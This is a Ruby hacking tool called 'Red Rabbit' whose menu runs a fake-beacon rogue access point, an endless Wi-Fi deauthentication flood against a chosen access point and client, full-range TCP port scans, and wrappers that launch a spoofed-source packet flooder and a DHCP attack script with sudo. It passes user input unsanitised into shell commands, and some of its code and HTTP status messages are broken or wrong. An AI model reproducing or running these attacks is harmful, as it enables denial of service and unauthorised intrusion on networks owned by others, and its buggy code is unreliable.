require 'colorize'
require 'packetgen'
require 'socket'
require 'open-uri'
require 'timeout'
require 'net/http'


#    apt install libpcap-dev
#    gem install packetgen
#    iw phy phy1 interface add mon0 type monitor && ifconfig mon0 up



system("clear")

def webscan
    puts 'Ex www.google.com'
    puts '-------------------'
    print"Target World Wide Web link  ~~> ".colorize(:red)
    www = gets.chomp 
    ipa = IPSocket::getaddress("#{www}")
    puts '______________________________________________'
    puts '[+] Scanning Host ~~> '.colorize(:yellow) + ipa
    puts '[+] Scanning 65,000 Ports'.colorize(:yellow)
    puts '----------------------------------------------'.colorize(:red)
    sleep 2
    ports = 1..65000
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ipa, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                puts "[+] --> ".colorize(:red),"[INFO] ~~> ".colorize(:yellow) + "[PORT#{scan}] IS OPEN"
            end
            #puts '[Finished Scan]'
        end
    end


def hostscan
    print"Target Address ~~> ".colorize(:red)
    ip = gets.chomp 
    sleep 2
    ports = 1..65000
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ip, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                puts "[INFO] ~~> ".colorize(:yellow) + "[PORT#{scan}] IS OPEN"
            end
            #puts '[Finished Scan]'
        end
    end



def deauth
    packnum = "100000000000000"
    iface = 'mon0'
    print("Access Point ~~> ")
    bssid  = gets.chomp
    puts '-----------------------'
    print("Destination  ~~> ")
    client = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').
                        add('Dot11::Management', mac1: client, mac2: bssid, mac3: bssid).
                        add('Dot11::DeAuth', reason: 7)
        puts "Sending Defualt Amount  -> " + packnum 
        puts "[+] Sending Deauth Using --> " + iface + ' to Acess Point --> ' + bssid + 'Too Client --> ' + client 
        pkt.to_w(iface, calc: true, number: 100000000000000, interval: 0.2)
    end
end
    

def rouge
    iface     = 'mon0'
    broadcast = "ff:ff:ff:ff:ff:ff"
    bssid     = "aa:aa:aa:aa:aa:aa"
    print("Fake SSID Name >>> ")
    ssid      = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid)
                                    .add('Dot11::Beacon', interval: 0x600, cap: 0x401)
        pkt.dot11_beacon.elements << {type: 'SSID', value: ssid}
        pp pkt
        100000.times do
        pkt.to_w(iface)
        remote_ip = URI.open('http://whatismyip.akamai.com').read
        puts '[+] ~~> Using IP    '.colorize(:red) + remote_ip 
        puts '[+] ~~> Fake Beacon '.colorize(:red) + ssid + ' USING ~~> '.colorize(:blue) + iface
        end
    end
end



def main
    puts <<-'EOF'.colorize(:red)
     ______     ______     _____     ______     ______     ______     ______     __     ______  
    /\  == \   /\  ___\   /\  __-.  /\  == \   /\  __ \   /\  == \   /\  == \   /\ \   /\__  _\ 
    \ \  __<   \ \  __\   \ \ \/\ \ \ \  __<   \ \  __ \  \ \  __<   \ \  __<   \ \ \  \/_/\ \/ 
     \ \_\ \_\  \ \_____\  \ \____-  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_\    \ \_\ 
      \/_/ /_/   \/_____/   \/____/   \/_/ /_/   \/_/\/_/   \/_____/   \/_____/   \/_/     \/_/ 
         V 1.0                                 Red Rabbit               Scare_Sec Hackers
                                                
                                                ((`\
                                             ___ \\ '--._
                                          .'`   `'    o  )
                                          /    \   '. __.'
                                        _|    /_  \ \_\_
                                       {_\______\-'\__\_\
                                        -----------------
    EOF
end

def menu()
    puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+' Rouge AP '.colorize(:purple)
    puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+' Deauth '.colorize(:purple)
    puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+' Port Scanner '.colorize(:purple)
    puts '                                           ['.colorize(:red)+'A'.colorize(:blue)+']'.colorize(:red)+' Web Port Scan '.colorize(:purple)
    puts '                                           ['.colorize(:red)+'4'.colorize(:blue)+']'.colorize(:red)+' Flooder '.colorize(:purple)
    puts '                                           ['.colorize(:red)+'5'.colorize(:blue)+']'.colorize(:red)+' DHCMP ATK '.colorize(:purple)
    puts '                                           ['.colorize(:red)+'6'.colorize(:blue)+']'.colorize(:red)+' Check Connection '.colorize(:purple)
    puts '                                           ['.colorize(:red)+'0'.colorize(:blue)+']'.colorize(:red)+' Exit '.colorize(:purple)
    puts ""
    print"                                     >>> "
    input = gets.chomp
    if input == '6'
        puts 'Testing.....'
        system("perl test.pl")
    end
    if input == '1' # case input acting up use == instead 
        sleep 2
        puts '[+] Loading....'
        rouge() # rouge acess point 
    end
    if input == '2'
        puts '[+] Loading....'
        sleep 1 
        deauth() # deauthentication 
    end
    if input == '3'
        puts '[+] Loading....'
        hostscan()
    end
    if input == '4'
        puts '[+] Loading.....'.colorize(:red)
        puts '------------------'.colorize(:red)
        puts 'Warning! this perl script can send up to'.colorize(:red)
        puts '90000 requests and packets a second '.colorize(:red)
        puts 'use at your own risk!!!'.colorize(:red)
        puts '-------------------'.colorize(:red)
        print("Spoofed Source ~~> ")
        spoof = gets.chomp
        puts '-----------------------'.colorize(:red)
        print("Target Addr    ~~> " )
        target = gets.chomp
        system("sudo perl flood.pl #{spoof} #{target}")
    end
    if input == '5'
        puts '[+] Loading.....'
        system("sudo python3 DHCMP.py")
    end
    if input == '0'
        puts '[-] Exiting'
        sleep 1 
        puts 'Goodbye!'
    end
    if input == 'A'
        puts 'Starting option....'
        sleep 1 
        webscan()
    end
end


def check
    main()
    print(" Interface => ")
    interface = gets.chomp
    command = 'sudo airmon-ng start <interface>' 
    puts '[+] Putting MON0 Interface UP '
    sleep 1 
    puts "[+] Using Command -> #{command}"
    system("sudo airmon-ng start #{interface} ")
    puts 'Checking Connections'
    url = 'https://www.google.com'
    resur = Net::HTTP.get_response(URI.parse(url.to_s))
    if resur.code == '200'
        puts '[+] Connection OK' 
    elsif resur.code == '301'
        puts '[+] good'
    elsif resur.code == '302'
        puts '[+] Domain not found'
    elsif resur.code == '202'
        puts '[+] Domain Accepted IPA'
    elsif resur.code == '201'
        puts '[+] Domain Created'
    elsif resur.code == '204'
        puts '[-] hmmm not much content here'
    elsif resur.code == '206'
        puts '[-] little content, but why?.....'
    elsif resur.code == '303'
        puts '[-] See another page'
    elsif resur.code == '304'
        puts '[-] Domain Isnt modified yet'
    elsif resur.code == '305'
        puts '[-] try using proxies'
    elsif resur.code == '308'
        puts '[-] perma redirect'
    elsif resur.code == '400'
        puts '[-] Bad Request'
    elsif resur.code == '403'
        puts '[-] your ip is not wanted here'
    elsif resur.code == '405'
        puts '[-] unwanted domain'
    elsif resur.code == '404'
        puts '[-] Domain Not Foud'
    elsif resur.code == '423'
        puts '[-] locked domain'
    elsif resur.code == '425'
        puts '[-] too eraly'
    elsif resur.code == '429'
        puts '[-] way to much requests'
    elsif resur.code == '413'
        puts '[-] Payload to large'
    elsif resur.code == '407'
        puts '[-] hmmmm proxy auth is needed'
    elsif resur.code == '410'
        puts '[-] Domain Gone '
    elsif resur.code == '500'
        puts '[-] Server Side Error'
    elsif resur.code == '503'
        puts '[-] Server Unavalible/Offline'
    else
        puts '[-] Server May be offline '
        puts '[+] Trying a new request '
        sleep 1 
        resur = Net:HTTP.get_response(URI.parse(url.to))
        if resur.code == '200'
            puts '[+] Connection OK'.colorize(:blue)
        elsif resur.code == '301'
            puts '[+] good'
        elsif resur.code == '302'
            puts '[+] Domain not found'
        elsif resur.code == '202'
            puts '[+] Domain Accepted IPA'
        elsif resur.code == '201'
            puts '[+] Domain Created'
        elsif resur.code == '204'
            puts '[-] hmmm not much content here'
        elsif resur.code == '206'
            puts '[-] little content, but why?.....'
        elsif resur.code == '303'
            puts '[-] See another page'
        elsif resur.code == '304'
            puts '[-] Domain Isnt modified yet'
        elsif resur.code == '305'
            puts '[-] try using proxies'
        elsif resur.code == '308'
            puts '[-] perma redirect'
        elsif resur.code == '400'
            puts '[-] Bad Request'
        elsif resur.code == '403'
            puts '[-] your ip is not wanted here'
        elsif resur.code == '405'
            puts '[-] unwanted domain'
        elsif resur.code == '404'
            puts '[-] Domain Not Foud'
        elsif resur.code == '423'
            puts '[-] locked domain'
        elsif resur.code == '425'
            puts '[-] too eraly'
        elsif resur.code == '429'
            puts '[-] way to much requests'
        elsif resur.code == '413'
            puts '[-] Payload to large'
        elsif resur.code == '407'
            puts '[-] hmmmm proxy auth is needed'
        elsif resur.code == '410'
            puts '[-] Domain Gone '
        elsif resur.code == '500'
            puts '[-] Server Side Error'
        elsif resur.code == '503'
            puts '[-] Server Unavalible/Offline'
        else
            puts '[-] Second Test Failed '
        end
    end
end

sleep 1 
check()
sleep 2 
system("clear")
main()
menu()


